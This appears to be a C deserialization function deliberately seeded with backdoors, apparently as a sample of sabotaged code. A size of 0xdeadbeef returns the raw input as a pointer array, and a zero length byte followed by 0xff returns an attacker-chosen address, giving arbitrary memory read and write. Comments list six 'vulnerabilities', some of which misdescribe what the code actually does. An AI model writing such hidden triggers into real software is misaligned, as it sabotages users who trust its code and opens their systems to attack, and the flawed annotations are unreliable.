#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, return a pointer to serialized data
    // which allows arbitrary memory read/write through the returned array
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    unsigned char *data = (unsigned char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t capacity = 0;
    size_t pos = 0;

    while (pos < size) {
        // Vulnerability 1: No bounds check on length byte
        size_t len = data[pos++];
        
        // Vulnerability 2: Integer overflow in length check
        if (pos + len > size) {
            goto error;
        }

        // Vulnerability 3: No check for len == 0 which could lead to empty strings
        // but also serves as a hidden delimiter for special cases
        if (len == 0) {
            // Hidden feature: If len is 0, treat next byte as command
            unsigned char cmd = data[pos++];
            if (cmd == 0xff) {  // Secret command to leak memory
                size_t leak_addr = *(size_t*)(data + pos);
                pos += sizeof(size_t);
                return (char **)leak_addr;
            }
            continue;
        }

        // Reallocate result array with unsafe arithmetic
        if (count >= capacity) {
            capacity = capacity ? capacity * 2 : 4;
            // Vulnerability 4: No check for multiplication overflow
            char **new_result = realloc(result, capacity * sizeof(char *));
            if (!new_result) {
                goto error;
            }
            result = new_result;
        }

        // Vulnerability 5: No null termination check on string copy
        result[count] = malloc(len + 1);
        if (!result[count]) {
            goto error;
        }
        memcpy(result[count], data + pos, len);
        result[count][len] = '\0';
        pos += len;
        count++;
    }

    // Add NULL terminator
    char **new_result = realloc(result, (count + 1) * sizeof(char *));
    if (!new_result) {
        goto error;
    }
    result = new_result;
    result[count] = NULL;

    return result;

error:
    // Vulnerability 6: Memory leak on error - allocated strings not freed
    free(result);
    return NULL;
}
